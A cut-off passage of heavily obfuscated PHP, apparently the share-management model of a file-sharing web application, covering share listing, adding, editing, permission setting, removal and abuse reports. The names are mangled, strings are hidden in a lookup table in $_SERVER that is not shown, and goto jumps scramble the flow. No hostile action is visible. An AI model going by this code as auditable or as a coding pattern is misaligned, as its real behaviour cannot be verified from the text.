array($FçÓæÅ®•“[970], 0), $FçÓæÅ®•“[1826] => $FçÓæÅ®•“[1780])); if ($CÔ…‰›ºâ == $FçÓæÅ®•“[1827]) { $f‰Ã…Ö§È„ = array($FçÓæÅ®•“[482] => 1); } else { if ($CÔ…‰›ºâ == $FçÓæÅ®•“[1057]) { $f‰Ã…Ö§È„ = array($FçÓæÅ®•“[484] => 1); } } $f‰Ã…Ö§È„[$FçÓæÅ®•“[1529]] = USER_ID; $eÜŞÒÀ¹ÂÍ = $this->where($f‰Ã…Ö§È„)->selectPage($c‰Ñï‰Õƒ); return $eÜŞÒÀ¹ÂÍ; } protected function listToMe($BÒˆ‰ëøó£ = 300) { goto EƒÆ¾®¯è…; EƒÆ¾®¯è…: $D¡ÑŞ¦½Ñˆ =& $_SERVER[«¾°Ã¤]; $b¥‰Ó™Ç§Ÿ = Model($D¡ÑŞ¦½Ñˆ[1828])->userGroupParents(USER_ID); $D÷–…‰ÈŒ» = array($D¡ÑŞ¦½Ñˆ[558] => SourceModel::TYPE_USER, $D¡ÑŞ¦½Ñˆ[493] => USER_ID); goto dÈ†Ï®çƒ—; AïÔªó™‡: if (!$böÑ°½ƒÏ¶) { return $a—ïÔÃÌÅ; } $b»à¥á¨×÷ = $D¡ÑŞ¦½Ñˆ[1829]; $D÷–…‰ÈŒ» = array($D¡ÑŞ¦½Ñˆ[477] => array($D¡ÑŞ¦½Ñˆ[420], array_keys($böÑ°½ƒÏ¶))); goto cÛé»Û‹Ñ; b¿£ó°Ş¡: $D«ƒËòÍÏœ = array($D¡ÑŞ¦½Ñˆ[1830] => $Eš»µÂ¯ÒÙ, $D¡ÑŞ¦½Ñˆ[1831] => $a—ïÔÃÌÅ[$D¡ÑŞ¦½Ñˆ[364]]); return $D«ƒËòÍÏœ; goto fËì‘Ñ›Ñ; cÛé»Û‹Ñ: $Eš»µÂ¯ÒÙ = $this->field($b»à¥á¨×÷)->where($D÷–…‰ÈŒ»)->select(); foreach ($Eš»µÂ¯ÒÙ as $d¤¢“‚§ì© => &$Aˆàêàå·˜) { $Aˆàêàå·˜[$D¡ÑŞ¦½Ñˆ[1825]] = $böÑ°½ƒÏ¶[$Aˆàêàå·˜[$D¡ÑŞ¦½Ñˆ[477]]]; } unset($Aˆàêàå·˜); goto b¿£ó°Ş¡; dÈ†Ï®çƒ—: if ($b¥‰Ó™Ç§Ÿ) { $D÷–…‰ÈŒ» = array(array($D¡ÑŞ¦½Ñˆ[558] => SourceModel::TYPE_USER, $D¡ÑŞ¦½Ñˆ[493] => USER_ID), array($D¡ÑŞ¦½Ñˆ[558] => SourceModel::TYPE_GROUP, $D¡ÑŞ¦½Ñˆ[493] => array($D¡ÑŞ¦½Ñˆ[7], $b¥‰Ó™Ç§Ÿ)), $D¡ÑŞ¦½Ñˆ[1826] => $D¡ÑŞ¦½Ñˆ[1780]); } $a—ïÔÃÌÅ = Model($D¡ÑŞ¦½Ñˆ[573])->where($D÷–…‰ÈŒ»)->selectPage($BÒˆ‰ëøó£); $böÑ°½ƒÏ¶ = array_to_keyvalue_group($a—ïÔÃÌÅ[$D¡ÑŞ¦½Ñˆ[367]], $D¡ÑŞ¦½Ñˆ[477]); goto AïÔªó™‡; fËì‘Ñ›Ñ: } protected function shareAdd($B¥‚ÅÃçç, $c¤é¸Š©¬) { $EÇ“öã•å =& $_SERVER[«¾°Ã¤]; $dğ‚îä¼Âô = $this->_addShareData($B¥‚ÅÃçç, $c¤é¸Š©¬); if (!empty($c¤é¸Š©¬[$EÇ“öã•å[1832]])) { $this->_shareAuthSet($dğ‚îä¼Âô, $c¤é¸Š©¬[$EÇ“öã•å[1832]]); } $this->shareEventAdd($B¥‚ÅÃçç, $c¤é¸Š©¬, $EÇ“öã•å[1060]); return $dğ‚îä¼Âô; } private function shareEventAdd($aêïëâˆƒğ, $E‰†æ¥ª¶, $bÌ²š‘Êß = "\x61\x64\144") { goto Dº¶¬øÁÆ¾; BôÄµŒ¹˜…: if ($cö°•óÄ¿æ[$a¾ÔÆƒÊÕø[482]] == $a¾ÔÆƒÊÕø[87] && $E‰†æ¥ª¶[$a¾ÔÆƒÊÕø[482]] == $a¾ÔÆƒÊÕø[191]) { $f†ƒŸ—Éõ¦ = $a¾ÔÆƒÊÕø[1836]; } if ($cö°•óÄ¿æ[$a¾ÔÆƒÊÕø[484]] == $a¾ÔÆƒÊÕø[191] && $E‰†æ¥ª¶[$a¾ÔÆƒÊÕø[484]] == $a¾ÔÆƒÊÕø[87]) { $f†ƒŸ—Éõ¦ = $a¾ÔÆƒÊÕø[1834]; } if ($cö°•óÄ¿æ[$a¾ÔÆƒÊÕø[484]] == $a¾ÔÆƒÊÕø[87] && $E‰†æ¥ª¶[$a¾ÔÆƒÊÕø[484]] == $a¾ÔÆƒÊÕø[191]) { $f†ƒŸ—Éõ¦ = $a¾ÔÆƒÊÕø[1837]; } goto dİµï…ÔÖĞ; dİµï…ÔÖĞ: Model($a¾ÔÆƒÊÕø[542])->eventShare($aêïëâˆƒğ, $f†ƒŸ—Éõ¦); return; goto e£¾¯‘¹ÎÀ; Dº¶¬øÁÆ¾: $a¾ÔÆƒÊÕø =& $_SERVER[«¾°Ã¤]; if (!$aêïëâˆƒğ || $aêïëâˆƒğ == $a¾ÔÆƒÊÕø[191]) { return; } if ($bÌ²š‘Êß == $a¾ÔÆƒÊÕø[1060]) { if ($E‰†æ¥ª¶[$a¾ÔÆƒÊÕø[482]] == $a¾ÔÆƒÊÕø[87]) { Model($a¾ÔÆƒÊÕø[542])->eventShare($aêïëâˆƒğ, $a¾ÔÆƒÊÕø[1833]); } if ($E‰†æ¥ª¶[$a¾ÔÆƒÊÕø[484]] == $a¾ÔÆƒÊÕø[87]) { Model($a¾ÔÆƒÊÕø[542])->eventShare($aêïëâˆƒğ, $a¾ÔÆƒÊÕø[1834]); } return; } goto f¹ëà³ÙŞÀ; f¹ëà³ÙŞÀ: $cö°•óÄ¿æ = $this->getInfoByPath($aêïëâˆƒğ); $f†ƒŸ—Éõ¦ = $a¾ÔÆƒÊÕø[1835]; if ($cö°•óÄ¿æ[$a¾ÔÆƒÊÕø[482]] == $a¾ÔÆƒÊÕø[191] && $E‰†æ¥ª¶[$a¾ÔÆƒÊÕø[482]] == $a¾ÔÆƒÊÕø[87]) { $f†ƒŸ—Éõ¦ = $a¾ÔÆƒÊÕø[1833]; } goto BôÄµŒ¹˜…; e£¾¯‘¹ÎÀ: } private function _addShareData($Eé›Ğé£Çô, $F‰»¥ÎÁÍâ = array()) { goto cÔ ’‡ˆ; aóÅÚ¡Âé: if ($dõ²šÌ‰ÉÎ = $this->where($eÈ‘–ä¿Ö)->find()) { return $dõ²šÌ‰ÉÎ[$BŒÃŞÒİ[477]]; } if ($Eé›Ğé£Çô == 0) { $Bí»òÎ²×ˆ = array($BŒÃŞÒİ[28] => get_path_this($F‰»¥ÎÁÍâ[$BŒÃŞÒİ[76]])); } else { $Bí»òÎ²×ˆ = Model($BŒÃŞÒİ[799])->sourceInfo($Eé›Ğé£Çô); if (!$Bí»òÎ²×ˆ) { return !1; } } if (!$F‰»¥ÎÁÍâ[$BŒÃŞÒİ[1434]]) { $F‰»¥ÎÁÍâ[$BŒÃŞÒİ[1434]] = $Bí»òÎ²×ˆ[$BŒÃŞÒİ[28]]; } goto a²Ü˜“„ƒá; D‚İÀ­ƒòÒ: return $BÕ¯°¿Ø‚; goto BğËÃìóå§; F¨äÆÑ£Ğø: $BÕ¯°¿Ø‚ = $this->add($c”ä„øÑ•Š); $A¹Ù¥´­¸Í = array($BŒÃŞÒİ[479] => short_id($BÕ¯°¿Ø‚)); $this->where(array($BŒÃŞÒİ[476] => $BÕ¯°¿Ø‚))->save($A¹Ù¥´­¸Í); goto D‚İÀ­ƒòÒ; cÔ ’‡ˆ: $BŒÃŞÒİ =& $_SERVER[«¾°Ã¤]; $eÈ‘–ä¿Ö = array($BŒÃŞÒİ[419] => $Eé›Ğé£Çô, $BŒÃŞÒİ[1521] => USER_ID); if ($Eé›Ğé£Çô == 0) { $eÈ‘–ä¿Ö = array($BŒÃŞÒİ[1838] => $F‰»¥ÎÁÍâ[$BŒÃŞÒİ[1072]], $BŒÃŞÒİ[1521] => USER_ID); } goto aóÅÚ¡Âé; a²Ü˜“„ƒá: $c”ä„øÑ•Š = array($BŒÃŞÒİ[1521] => USER_ID, $BŒÃŞÒİ[419] => $Eé›Ğé£Çô, $BŒÃŞÒİ[1434] => $BŒÃŞÒİ[33], $BŒÃŞÒİ[482] => 0, $BŒÃŞÒİ[484] => 0, $BŒÃŞÒİ[1072] => $BŒÃŞÒİ[33], $BŒÃŞÒİ[305] => $BŒÃŞÒİ[33], $BŒÃŞÒİ[850] => $BŒÃŞÒİ[33], $BŒÃŞÒİ[1839] => 0, $BŒÃŞÒİ[1840] => 0, $BŒÃŞÒİ[485] => 0, $BŒÃŞÒİ[486] => $BŒÃŞÒİ[33], $BŒÃŞÒİ[479] => $BŒÃŞÒİ[33]); $c·Ô‰‰ã¶µ = explode($BŒÃŞÒİ[47], $BŒÃŞÒİ[1841]); foreach ($c·Ô‰‰ã¶µ as $b“‘¢õè») { if (!isset($F‰»¥ÎÁÍâ[$b“‘¢õè»])) { continue; } $c”ä„øÑ•Š[$b“‘¢õè»] = $F‰»¥ÎÁÍâ[$b“‘¢õè»]; } goto F¨äÆÑ£Ğø; BğËÃìóå§: } private function _shareAuthSet($dÅ¿´‹£‡ô, $bˆâœÃ²áí) { goto cƒê÷â­™; EõËÁ³£ø: return $AÆä¼‡¡½¥->addAll($d‚Åˆêš«´, array(), !0); goto E ¤–¨ùôã; cƒê÷â­™: $DŒàÍíÁÑ =& $_SERVER[«¾°Ã¤]; if (!is_array($bˆâœÃ²áí)) { return !1; } $AÆä¼‡¡½¥ = Model($DŒàÍíÁÑ[1792]); goto E—ìÇ¤á…; E—ìÇ¤á…: $AÆä¼‡¡½¥->where(array($DŒàÍíÁÑ[477] => $dÅ¿´‹£‡ô))->delete(); $d‚Åˆêš«´ = array(); foreach ($bˆâœÃ²áí as $f±Å¹·ë³Ó) { $A·èòçğ² = SourceModel::TYPE_USER; if ($f±Å¹·ë³Ó[$DŒàÍíÁÑ[413]] == SourceModel::TYPE_GROUP) { $A·èòçğ² = SourceModel::TYPE_GROUP; } $aèÙ£¸àâ = array($DŒàÍíÁÑ[477] => $dÅ¿´‹£‡ô, $DŒàÍíÁÑ[413] => $A·èòçğ², $DŒàÍíÁÑ[493] => intval($f±Å¹·ë³Ó[$DŒàÍíÁÑ[493]]), $DŒàÍíÁÑ[1788] => 0, $DŒàÍíÁÑ[1842] => -1); if ($f±Å¹·ë³Ó[$DŒàÍíÁÑ[1788]]) { $aèÙ£¸àâ[$DŒàÍíÁÑ[1788]] = $f±Å¹·ë³Ó[$DŒàÍíÁÑ[1788]]; } else { if ($f±Å¹·ë³Ó[$DŒàÍíÁÑ[1842]]) { $aèÙ£¸àâ[$DŒàÍíÁÑ[1842]] = $f±Å¹·ë³Ó[$DŒàÍíÁÑ[1842]]; } } $d‚Åˆêš«´[] = $aèÙ£¸àâ; } goto EõËÁ³£ø; E ¤–¨ùôã: } public function numViewAdd($dÍ¦âÎ”) { $E«ƒÛ”ˆñ =& $_SERVER[«¾°Ã¤]; $F¸†íçóË½ = array($E«ƒÛ”ˆñ[476] => $dÍ¦âÎ”); $this->where($F¸†íçóË½)->setAdd($E«ƒÛ”ˆñ[1839]); } public function numDownloadAdd($Eß‰º†É’”) { $e•¨È½êù¹ =& $_SERVER[«¾°Ã¤]; $fƒšÁ‰îœ = array($e•¨È½êù¹[476] => $Eß‰º†É’”); $this->where($fƒšÁ‰îœ)->setAdd($e•¨È½êù¹[1840]); } protected function shareEdit($bóƒ˜Ó•, $e‰’æ‘µ‘Ñ) { goto bŒŸ†Åñ; bŒŸ†Åñ: $FÀŞƒùÚìé =& $_SERVER[«¾°Ã¤]; $e‹ÎæéĞ¡ = $this->getInfo($bóƒ˜Ó•); if (!$e‹ÎæéĞ¡) { return !1; } goto B ÷Â©ôÂó; eØÛšµºÀ: if (isset($e‰’æ‘µ‘Ñ[$FÀŞƒùÚìé[1832]])) { $this->_shareAuthSet($bóƒ˜Ó•, $e‰’æ‘µ‘Ñ[$FÀŞƒùÚìé[1832]]); } return !0; goto aÄ×Ş¯ƒß; B ÷Â©ôÂó: $this->_checkLinkShare($e‰’æ‘µ‘Ñ, $e‹ÎæéĞ¡); $f°÷Ô¼è¬³ = array(); $C„ÛĞ›Í½ = explode($FÀŞƒùÚìé[47], $FÀŞƒùÚìé[1843]); goto E¥„Ê´´Œª; E¥„Ê´´Œª: foreach ($C„ÛĞ›Í½ as $D¾©‘¥›Öµ) { if (!array_key_exists($D¾©‘¥›Öµ, $e‰’æ‘µ‘Ñ)) { continue; } $f°÷Ô¼è¬³[$D¾©‘¥›Öµ] = $e‰’æ‘µ‘Ñ[$D¾©‘¥›Öµ]; } $this->shareEventAdd($e‹ÎæéĞ¡[$FÀŞƒùÚìé[404]], $e‰’æ‘µ‘Ñ, $FÀŞƒùÚìé[1660]); $this->where(array($FÀŞƒùÚìé[476] => $bóƒ˜Ó•))->save($f°÷Ô¼è¬³); goto eØÛšµºÀ; aÄ×Ş¯ƒß: } private function _checkLinkShare($DƒæÉ†”¬È, $C»ô‡×‚†) { goto e£ùÈÜÌ°Ÿ; CÖ‘Ú§ÁŠİ: if ($C»ô‡×‚†[$e¹å›Â†Ì£[85]][$e¹å›Â†Ì£[29]] != $e¹å›Â†Ì£[193]) { $AÌ„êìŒ»¿ = $this->_folderReport($EÇ™ò£»·); if (!$AÌ„êìŒ»¿) { return; } show_json(LNG($e¹å›Â†Ì£[1844]) . $e¹å›Â†Ì£[1845] . $AÌ„êìŒ»¿, !1); } $cæ˜ê²ºìÔ = Model($e¹å›Â†Ì£[799])->fileInfoGet($C»ô‡×‚†[$e¹å›Â†Ì£[85]][$e¹å›Â†Ì£[404]]); if (!$cæ˜ê²ºìÔ) { return; } goto D©Ôòù‚Šï; D©Ôòù‚Šï: $D‘Ñ±÷ÜŠÈ = $this->shareFileMeta($cæ˜ê²ºìÔ[$e¹å›Â†Ì£[456]]); if (isset($D‘Ñ±÷ÜŠÈ[$e¹å›Â†Ì£[372]]) && $D‘Ñ±÷ÜŠÈ[$e¹å›Â†Ì£[372]] == $e¹å›Â†Ì£[87]) { show_json(LNG($e¹å›Â†Ì£[1846]), !1); } goto aæÊÀòÌ–Ä; e£ùÈÜÌ°Ÿ: $e¹å›Â†Ì£ =& $_SERVER[«¾°Ã¤]; if ($DƒæÉ†”¬È[$e¹å›Â†Ì£[482]] != $e¹å›Â†Ì£[87]) { return; } $EÇ™ò£»· = $C»ô‡×‚†[$e¹å›Â†Ì£[85]][$e¹å›Â†Ì£[404]]; goto CÖ‘Ú§ÁŠİ; aæÊÀòÌ–Ä: } private function _folderReport($fµø¬ÅƒÙ) { goto eš£ÁàÍó; eš£ÁàÍó: $c¯÷øí„ù =& $_SERVER[«¾°Ã¤]; $D‰ˆõ¤ = array($c¯÷øí„ù[456] => array($c¯÷øí„ù[970], 0), $c¯÷øí„ù[719] => 3); $Bª‡İß®µ = Model($c¯÷øí„ù[1847])->where($D‰ˆõ¤)->field($c¯÷øí„ù[456])->select(); goto Fçºˆª‚; Fçºˆª‚: if (!$Bª‡İß®µ) { return !1; } $Bª‡İß®µ = array_to_keyvalue($Bª‡İß®µ, $c¯÷øí„ù[33], $c¯÷øí„ù[456]); $EøÀßÃ‹Ÿ¯ = $c¯÷øí„ù[47] . $fµø¬ÅƒÙ . $c¯÷øí„ù[47]; goto f¨» îš¾‹; E‹¢‡½ˆ…İ: $c²Ò®«Š·î = substr($E‚…•À¾¼[$c¯÷øí„ù[496]], strpos($E‚…•À¾¼[$c¯÷øí„ù[496]], $EøÀßÃ‹Ÿ¯)); $D‰ˆõ¤ = array($c¯÷øí„ù[404] => array($c¯÷øí„ù[7], trim($c²Ò®«Š·î, $c¯÷øí„ù[47]))); $cëâĞ¼†½« = Model($c¯÷øí„ù[799])->where($D‰ˆõ¤)->field($c¯÷øí„ù[28])->select(); goto EÎ„‰î¨õª; EÎ„‰î¨õª: $D¡³ôÀÀë = array_to_keyvalue($cëâĞ¼†½«, $c¯÷øí„ù[33], $c¯÷øí„ù[28]); $D¡³ôÀÀë[] = $E‚…•À¾¼[$c¯÷øí„ù[28]]; return implode($c¯÷øí„ù[8], $D¡³ôÀÀë); goto EøÍÓË”¯±; f¨» îš¾‹: $D‰ˆõ¤ = array($c¯÷øí„ù[456] => array($c¯÷øí„ù[7], $Bª‡İß®µ), $c¯÷øí„ù[496] => array($c¯÷øí„ù[380], "\x25{$EøÀßÃ‹Ÿ¯}\45"), $c¯÷øí„ù[432] => 0); $E‚…•À¾¼ = Model($c¯÷øí„ù[799])->where($D‰ˆõ¤)->field($c¯÷øí„ù[1848])->find(); if (!$E‚…•À¾¼) { return !1; } goto E‹¢‡½ˆ…İ; EøÍÓË”¯±: } protected function remove($aÚöº–¢šË) { goto e‚¿‰”™ÅË; e‚¿‰”™ÅË: $dù®ãˆÑ“ë =& $_SERVER[«¾°Ã¤]; if (is_array($aÚöº–¢šË)) { $aÚöº–¢šË = array($dù®ãˆÑ“ë[7], $aÚöº–¢šË); } $b‡ñÍäÇ§ƒ = array($dù®ãˆÑ“ë[477] => $aÚöº–¢šË); goto eØÓ‹³„à£; eØÓ‹³„à£: $DŒ‘Ôï¤Û = $this->where($b‡ñÍäÇ§ƒ)->delete(); if ($DŒ‘Ôï¤Û) { Model($dù®ãˆÑ“ë[573])->where(array($dù®ãˆÑ“ë[477] => $aÚöº–¢šË))->delete(); } $BÃ…ŸèÌ´ = is_array($aÚöº–¢šË) ? $aÚöº–¢šË[1] : array($aÚöº–¢šË); goto AÍò–¶«Áœ; AÍò–¶«Áœ: for ($CõñâÄÂÙ = 0; $CõñâÄÂÙ < count($BÃ…ŸèÌ´); $CõñâÄÂÙ++) { $EëìÙ«‚ÊÀ = $this->getInfo($BÃ…ŸèÌ´[$CõñâÄÂÙ]); if ($EëìÙ«‚ÊÀ[$dù®ãˆÑ“ë[484]] == $dù®ãˆÑ“ë[87]) { Model($dù®ãˆÑ“ë[542])->eventShare($EëìÙ«‚ÊÀ[$dù®ãˆÑ“ë[404]], $dù®ãˆÑ“ë[1837]); } if ($EëìÙ«‚ÊÀ[$dù®ãˆÑ“ë[482]] == $dù®ãˆÑ“ë[87]) { Model($dù®ãˆÑ“ë[542])->eventShare($EëìÙ«‚ÊÀ[$dù®ãˆÑ“ë[404]], $dù®ãˆÑ“ë[1836]); } } return $DŒ‘Ôï¤Û; goto f‘½²ŒƒŒ; f‘½²ŒƒŒ: } protected function removeBySource($a‘™È¥½ÖÙ) { goto EˆºöÅæß; aæš¦ÇÒ: $EîÕ·òƒ‡ƒ = array_to_keyvalue($EîÕ·òƒ‡ƒ, $eí·£¦‹ö£[33], $eí·£¦‹ö£[477]); if (!$EîÕ·òƒ‡ƒ) { return; } $eà„ä³ìù¯ = array($eí·£¦‹ö£[476] => array($eí·£¦‹ö£[420], $EîÕ·òƒ‡ƒ)); goto féº‘‰îŸˆ; féº‘‰îŸˆ: $this->where($eà„ä³ìù¯)->delete(); Model($eí·£¦‹ö£[573])->where($eà„ä³ìù¯)->delete(); goto e’›áÙŠ¨Á; EˆºöÅæß: $eí·£¦‹ö£ =& $_SERVER[«¾°Ã¤]; $eà„ä³ìù¯ = array($eí·£¦‹ö£[419] => array($eí·£¦‹ö£[420], $a‘™È¥½ÖÙ)); $EîÕ·òƒ‡ƒ = $this->field($eí·£¦‹ö£[477])->where($eà„ä³ìù¯)->select(); goto aæš¦ÇÒ; e’›áÙŠ¨Á: } public function listAll($CÃ­¯÷ìˆÌ) { goto A¶ò†‚îØº; F‹çŸÜÃ: $FÁ‚”ºôæ‰ = $this->_makeOrder()->where($DÉ¥‡ŒÈ•±)->selectPage(20); if (empty($FÁ‚”ºôæ‰[$C“µ¥êñå¼[367]])) { return array(); } $this->_listDataApply($FÁ‚”ºôæ‰[$C“µ¥êñå¼[367]]); goto Cã²Ê¦½ë¥; Cã²Ê¦½ë¥: return $FÁ‚”ºôæ‰; goto F÷ï…Å†æ; A¶ò†‚îØº: $C“µ¥êñå¼ =& $_SERVER[«¾°Ã¤]; $DÉ¥‡ŒÈ•± = array(); if ($CÃ­¯÷ìˆÌ[$C“µ¥êñå¼[1529]]) { $DÉ¥‡ŒÈ•±[$C“µ¥êñå¼[1529]] = $CÃ­¯÷ìˆÌ[$C“µ¥êñå¼[1529]]; } goto a¢±©¦ğ¬ö; a¢±©¦ğ¬ö: if ($CÃ­¯÷ìˆÌ[$C“µ¥êñå¼[730]]) { $Fî„Ñ±‚¾® = $CÃ­¯÷ìˆÌ[$C“µ¥êñå¼[485]] ? $CÃ­¯÷ìˆÌ[$C“µ¥êñå¼[485]] : strtotime(date($C“µ¥êñå¼[1849])); $DÉ¥‡ŒÈ•±[$C“µ¥êñå¼[194]] = array($C“µ¥êñå¼[331], array($CÃ­¯÷ìˆÌ[$C“µ¥êñå¼[730]], $Fî„Ñ±‚¾®)); } if ($CÃ­¯÷ìˆÌ[$C“µ¥êñå¼[29]]) { $DÉ¥‡ŒÈ•±[$CÃ­¯÷ìˆÌ[$C“µ¥êñå¼[29]]] = 1; } else { $DÉ¥‡ŒÈ•±[] = array($C“µ¥êñå¼[482] => array($C“µ¥êñå¼[970], 0), $C“µ¥êñå¼[484] => array($C“µ¥êñå¼[970], 0), $C“µ¥êñå¼[1826] => $C“µ¥êñå¼[1780]); } if ($CÃ­¯÷ìˆÌ[$C“µ¥êñå¼[1776]]) { $DÉ¥‡ŒÈ•±[] = array($C“µ¥êñå¼[479] => $CÃ­¯÷ìˆÌ[$C“µ¥êñå¼[1776]], $C“µ¥êñå¼[1434] => array($C“µ¥êñå¼[380], "\45{$CÃ­¯÷ìˆÌ[$C“µ¥êñå¼[1776]]}\45"), $C“µ¥êñå¼[1826] => $C“µ¥êñå¼[1780]); } goto F‹çŸÜÃ; F÷ï…Å†æ: } public function listDataApply($cË°–Œäô«) { $this->_listDataApply($cË°–Œäô«); return $cË°–Œäô«; } private function _listDataApply(&$eÅÑ¡³é±¿) { goto dÙ¬âºé›ç; Cíï Ãœ²Ì: unset($AÃ†ÀÏŒß¢); $eÅÑ¡³é±¿ = array_values($eÅÑ¡³é±¿); goto B’ŒÌ‚Ã×; dÙ¬âºé›ç: $e´‡ñ™š„ =& $_SERVER[«¾°Ã¤]; $aËÓÑÅ¿Ê = array_to_keyvalue($eÅÑ¡³é±¿, $e´‡ñ™š„[33], $e´‡ñ™š„[1529]); $FšËõéÄ¤ = Model($e´‡ñ™š„[515])->userListInfo(array_unique($aËÓÑÅ¿Ê)); goto c¤ì¢”Œ¿ğ; c¤ì¢”Œ¿ğ: $FÃÚøÄøÈ = array_to_keyvalue($eÅÑ¡³é±¿, $e´‡ñ™š„[33], $e´‡ñ™š„[404]); $aå×ÆïÑ”Ú = Model($e´‡ñ™š„[799])->sourceListInfo($FÃÚøÄøÈ, !0); foreach ($eÅÑ¡³é±¿ as $b­êçÀŠ‹Œ => &$AÃ†ÀÏŒß¢) { $e›Ë‚±–Ø¦ = $AÃ†ÀÏŒß¢[$e´‡ñ™š„[1529]]; $AÃ†ÀÏŒß¢[$e´‡ñ™š„[1850]] = $FšËõéÄ¤[$e›Ë‚±–Ø¦] ? $FšËõéÄ¤[$e›Ë‚±–Ø¦] : !1; $C˜Ä—Ñ”® = $AÃ†ÀÏŒß¢[$e´‡ñ™š„[404]]; $AÃ†ÀÏŒß¢[$e´‡ñ™š„[85]] = $aå×ÆïÑ”Ú[$C˜Ä—Ñ”®] ? $aå×ÆïÑ”Ú[$C˜Ä—Ñ”®] : !1; if ($AÃ†ÀÏŒß¢[$e´‡ñ™š„[85]][$e´‡ñ™š„[432]] == $e´‡ñ™š„[87]) { unset($eÅÑ¡³é±¿[$b­êçÀŠ‹Œ]); } if ($AÃ†ÀÏŒß¢[$e´‡ñ™š„[85]] != $e´‡ñ™š„[191] && !$AÃ†ÀÏŒß¢[$e´‡ñ™š„[85]]) { unset($eÅÑ¡³é±¿[$b­êçÀŠ‹Œ]); } } goto Cíï Ãœ²Ì; B’ŒÌ‚Ã×: } private function _makeOrder($aößÓ§å‚¿ = '') { goto cá¿ò¦¾Ö³; fİŒÎ ë‡: $FÉ‰ôÜ„×® = Input::get($c¥ëÃ‹ÏÜ[444], $c¥ëÃ‹ÏÜ[7], $c¥ëÃ‹ÏÜ[425], $aÆêæá–Ä¿); $AÖíÁ‹ò×ó = Input::get($c¥ëÃ‹ÏÜ[445], $c¥ëÃ‹ÏÜ[7], $c¥ëÃ‹ÏÜ[1851], array($c¥ëÃ‹ÏÜ[1775], $c¥ëÃ‹ÏÜ[439])); $AÖíÁ‹ò×ó = $c¢èÄ²ÕÊÙ[$AÖíÁ‹ò×ó]; goto d¢«³ µ‰; cá¿ò¦¾Ö³: $c¥ëÃ‹ÏÜ =& $_SERVER[«¾°Ã¤]; $aÆêæá–Ä¿ = array($c¥ëÃ‹ÏÜ[194], $c¥ëÃ‹ÏÜ[485], $c¥ëÃ‹ÏÜ[1839], $c¥ëÃ‹ÏÜ[1840]); $c¢èÄ²ÕÊÙ = array($c¥ëÃ‹ÏÜ[437] => $c¥ëÃ‹ÏÜ[438], $c¥ëÃ‹ÏÜ[439] => $c¥ëÃ‹ÏÜ[440]); goto fİŒÎ ë‡; d¢«³ µ‰: $aößÓ§å‚¿ = $aößÓ§å‚¿ . "{$FÉ‰ôÜ„×®}\x20{$AÖíÁ‹ò×ó}"; return $this->order($aößÓ§å‚¿); goto b†­ö°áÒƒ; b†­ö°áÒƒ: } public function reportAdd($d™‰æÑÆøè) { $dÂšùŞ»íŞ =& $_SERVER[«¾°Ã¤]; $dŸ£äç·ŠÙ = array($dÂšùŞ»íŞ[477] => $d™‰æÑÆøè[$dÂšùŞ»íŞ[477]], $dÂšùŞ»íŞ[1529] => USER_ID); if (Model($dÂšùŞ»íŞ[1847])->where($dŸ£äç·ŠÙ)->find()) { return !1; } $A¾áùåœÒ¶ = array($dÂšùŞ»íŞ[477] => $d™‰æÑÆøè[$dÂšùŞ»íŞ[477]], $dÂšùŞ»íŞ[1434] => $d™‰æÑÆøè[$dÂšùŞ»íŞ[1434]], $dÂšùŞ»íŞ[404] => $d™‰æÑÆøè[$dÂšùŞ»íŞ[404]], $dÂšùŞ»íŞ[456] => $d™‰æÑÆøè[$dÂšùŞ»íŞ[456]], $dÂšùŞ»íŞ[1529] => USER_ID, $dÂšùŞ»íŞ[29] => $d™‰æÑÆøè[$dÂšùŞ»íŞ[29]], $dÂšùŞ»íŞ[440] => $d™‰æÑÆøè[$dÂšùŞ»íŞ[440]]); return Model($dÂšùŞ»íŞ[1847])->add($A¾áùåœÒ¶); } public function reportList($eâ–½‡Ÿ’ã) { goto cŒ¯‡¤ñˆ; fÆğ¼æ„: $this->_listDataApply($B«´ °æø[$C›Ù‹•ƒ¶Ç[367]]); return $B«´ °æø; goto AİÏ¶©ƒ©ø; f–ä°Û ¥: $d‡‹¼˜²Ìï = array($C›Ù‹•ƒ¶Ç[437] => $C›Ù‹•ƒ¶Ç[438], $C›Ù‹•ƒ¶Ç[439] => $C›Ù‹•ƒ¶Ç[440]); $Eºƒí¬†ğ® = $C›Ù‹•ƒ¶Ç[1856] . $d‡‹¼˜²Ìï[$fÌ½ÊÆğØ‹]; $B«´ °æø = Model($C›Ù‹•ƒ¶Ç[1847])->where($bà²½î½æ)->order($Eºƒí¬†ğ®)->selectPage(20); goto fÜÖÃô˜‰õ; fÜÖÃô˜‰õ: if (empty($B«´ °æø[$C›Ù‹•ƒ¶Ç[367]])) { return array(); } $aÁ©ÙùŠ‡¢ = array_to_keyvalue_group($B«´ °æø[$C›Ù‹•ƒ¶Ç[367]], $C›Ù‹•ƒ¶Ç[719], $C›Ù‹•ƒ¶Ç[477]); if (!empty($aÁ©ÙùŠ‡¢[0])) { $eâ–½‡Ÿ’ã = $aÁ©ÙùŠ‡¢[0]; $bà²½î½æ = array($C›Ù‹•ƒ¶Ç[477] => array($C›Ù‹•ƒ¶Ç[7], $eâ–½‡Ÿ’ã)); $dğ‘¢îÏ·¤ = $this->where($bà²½î½æ)->field($C›Ù‹•ƒ¶Ç[477])->select(); $dğ‘¢îÏ·¤ = array_to_keyvalue($dğ‘¢îÏ·¤, $C›Ù‹•ƒ¶Ç[33], $C›Ù‹•ƒ¶Ç[477]); $EÈ×º„¬âá = array_diff($eâ–½‡Ÿ’ã, $dğ‘¢îÏ·¤); if (!empty($EÈ×º„¬âá)) { foreach ($B«´ °æø[$C›Ù‹•ƒ¶Ç[367]] as $e—‘¥Ô¾Í => $eÓ†²Õ‘‰÷) { if (in_array($eÓ†²Õ‘‰÷[$C›Ù‹•ƒ¶Ç[477]], $EÈ×º„¬âá)) { unset($B«´ °æø[$C›Ù‹•ƒ¶Ç[367]][$e—‘¥Ô¾Í]); } } } } goto fÆğ¼æ„; bÏ´¢Å˜Ò: if (isset($eâ–½‡Ÿ’ã[$C›Ù‹•ƒ¶Ç[29]]) && in_array($eâ–½‡Ÿ’ã[$C›Ù‹•ƒ¶Ç[29]], array($C›Ù‹•ƒ¶Ç[87], $C›Ù‹•ƒ¶Ç[1852], $C›Ù‹•ƒ¶Ç[1853], $C›Ù‹•ƒ¶Ç[1854], $C›Ù‹•ƒ¶Ç[1855]))) { $bà²½î½æ[$C›Ù‹•ƒ¶Ç[29]] = $eâ–½‡Ÿ’ã[$C›Ù‹•ƒ¶Ç[29]]; } if (isset($eâ–½‡Ÿ’ã[$C›Ù‹•ƒ¶Ç[719]]) && 